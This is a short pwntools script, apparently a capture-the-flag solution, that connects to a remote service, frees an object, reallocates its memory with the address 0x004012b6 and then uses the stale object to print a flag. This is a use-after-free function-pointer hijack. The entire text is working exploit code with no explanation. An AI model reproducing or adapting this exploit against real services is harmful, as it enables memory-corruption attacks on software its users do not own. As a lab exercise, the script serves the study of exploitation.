from pwn import *

r = remote('172.17.0.13', 14561)

r.recvline()
r.sendline(b'create 1')
r.recvline()
r.sendline(b'delete 1')
r.recvline()
r.sendline(b'alloc_data 1 0x004012b6')
r.recvline()
r.sendline(b'use 1')

flag = r.recvline().decode().strip()
print(flag)